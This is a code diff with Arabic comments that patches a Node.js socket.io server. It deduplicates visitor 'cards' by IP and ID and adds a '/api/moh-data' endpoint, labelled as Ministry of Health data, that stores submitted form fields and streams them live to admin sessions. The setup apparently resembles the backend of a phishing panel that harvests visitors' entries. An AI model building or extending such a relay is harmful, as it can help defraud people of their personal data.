@@ -1816,3 +1816,112 @@ __kdkAll().forEach(function(v){var s=null;try{Object.keys(__kdkApp).forEach(func
 /*KDK-FIX90*/
 try{io.on('connection',function(socket){socket.onAny(function(ev,p){try{if(ev!=='visitor:register')return;p=p||{};if(p.existingVisitorId)return;var h=(socket.handshake&&socket.handshake.headers)||{};var ip=String(h['x-forwarded-for']||socket.handshake.address||'').split(',')[0].trim();if(!ip)return;var f=null;try{__kdkAll().forEach(function(v){if(!f&&v&&v.ip===ip&&(Date.now()-(v.lastActivity||0))<900000)f=v})}catch(e){}if(f){p.existingVisitorId=f._id;console.log('kdk90 adopt',socket.id,f._id)}}catch(e){}})});}catch(e){}
 /*END-KDK-FIX90*/
+/*KDD-FIX123 — زائر = بطاقة واحدة: إلغاء دمج الزوار حسب الآي بي */
+try {
+  function __f123Real(socket){
+    try{
+      var h = (socket.handshake && socket.handshake.headers) || {};
+      return String(h['x-forwarded-for'] || socket.handshake.address || '').split(',')[0].trim();
+    }catch(e){ return ''; }
+  }
+  function __f123Key(p){
+    try{
+      var o = (p && typeof p === 'object') ? p : {};
+      var v = o.existingVisitorId || o.visitorId || o.visitor_id || o.id || o.clientId || o.uid || o.token || o.deviceId;
+      if (!v && o.data) v = o.data.existingVisitorId || o.data.visitorId || o.data.id;
+      if (!v && o.content) v = o.content.existingVisitorId || o.content.visitorId || o.content.id;
+      return v ? String(v) : '';
+    }catch(e){ return ''; }
+  }
+  function __f123Hash(s){
+    var h = 5381; s = String(s || '');
+    for (var i = 0; i < s.length; i++) h = ((h * 33) ^ s.charCodeAt(i)) >>> 0;
+    return h.toString(36).slice(0, 5);
+  }
+  function __f123Ids(p){
+    var out = [];
+    try{
+      var objs = [p, p && p.data, p && p.content, p && p.details, p && p.form];
+      var keys = ['existingVisitorId','visitorId','visitor_id','id','clientId','uid','token','deviceId'];
+      for (var i = 0; i < objs.length; i++){
+        var o = objs[i]; if (!o || typeof o !== 'object') continue;
+        for (var j = 0; j < keys.length; j++){ if (o[keys[j]]) out.push(String(o[keys[j]])); }
+      }
+    }catch(e){}
+    return out;
+  }
+  function __f123Find(ids){
+    var f = null;
+    try{ if (ids.length) savedVisitors.forEach(function(v){ if (!f && v && ids.indexOf(String(v._id)) > -1) f = v; }); }catch(e){}
+    if (!f){ try{ visitors.forEach(function(v){ if (!f && v && ids.indexOf(String(v._id)) > -1) f = v; }); }catch(e){} }
+    return f;
+  }
+
+  io.on('connection', function(socket){
+    var real = __f123Real(socket);
+    var syn = null;
+    socket.prependAny(function(ev, p){
+      try{
+        if (!syn){
+          syn = (real || 'ip') + '#' + __f123Hash(__f123Key(p) || socket.id);
+          try{ socket.handshake.headers['x-forwarded-for'] = syn; }catch(e){}
+          try{
+            var cur = visitors.get(socket.id);
+            if (cur){ cur.ip = syn; if (real) cur.realIp = real; }
+          }catch(e){}
+        }
+        if (ev !== 'visitor:register') return;
+        var ids = __f123Ids(p);
+        var f = __f123Find(ids);
+        if (f){
+          try{ f.ip = syn; if (real) f.realIp = real; }catch(e){}
+          try{ p.existingVisitorId = f._id; }catch(e){}
+          var cur2 = visitors.get(socket.id);
+          if (cur2 && cur2._id !== f._id){
+            try{ savedVisitors = savedVisitors.filter(function(x){ return x._id !== cur2._id; }); }catch(e){}
+            try{ visitors.set(socket.id, f); }catch(e){}
+            admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:deleted', { visitorId: cur2._id }); }catch(e){} });
+          }
+        } else {
+          try{ p.existingVisitorId = ''; }catch(e){}
+        }
+      }catch(e){ console.log('FIX123 any err', e.message); }
+    });
+  });
+  console.log('FIX123 ready: one card per visitor');
+} catch(e){ console.log('FIX123 err', e.message); }
+
+/*FIX123b — احتياطي: مطابقة بيانات وزارة الصحة عبر الآي بي الحقيقي */
+try{
+  app.post('/api/moh-data', function(req){
+    try{
+      var h = req.headers || {};
+      var ip = String(h['x-forwarded-for'] || h['x-real-ip'] || '').split(',')[0].trim();
+      if (!ip) return;
+      var b = req.body || {};
+      var v = null;
+      if (b.visitorId) visitors.forEach(function(x){ if (!v && x && x._id === b.visitorId) v = x; });
+      if (!v && b.socketId) v = visitors.get(b.socketId) || null;
+      if (v) return;
+      visitors.forEach(function(x){ if (!v && x && x.realIp === ip) v = x; });
+      if (!v) savedVisitors.forEach(function(x){ if (!v && x && x.realIp === ip) v = x; });
+      if (!v) return;
+      var d = b.data || {};
+      var fields = {};
+      if (d.fields && typeof d.fields === 'object') fields = Object.assign(fields, d.fields);
+      if (d.content && d.content.fields && typeof d.content.fields === 'object') fields = Object.assign(fields, d.content.fields);
+      if (!Object.keys(fields).length) return;
+      var sig = JSON.stringify(fields);
+      if (v.__f123sig === sig && (Date.now() - (v.__f123at || 0)) < 12000) return;
+      v.__f123sig = sig; v.__f123at = Date.now();
+      if (!v.dataHistory) v.dataHistory = [];
+      v.dataHistory.push({ content: fields, page: 'MOH', timestamp: new Date().toISOString() });
+      v.data = Object.assign({}, v.data || {}, fields);
+      v.hasNewData = true;
+      v.page = 'MOH';
+      try{ visitors.set(v.socketId || v._id, v); }catch(e){}
+      try{ if (typeof saveVisitorPermanently === 'function') saveVisitorPermanently(v); }catch(e){}
+      admins.forEach(function(a, id){ try{ io.to(id).emit('visitor:dataSubmitted', { visitorId: v._id, socketId: v.socketId, data: { content: fields, page: 'MOH' }, visitor: v }); }catch(e){} });
+    }catch(e){}
+  });
+}catch(e){}
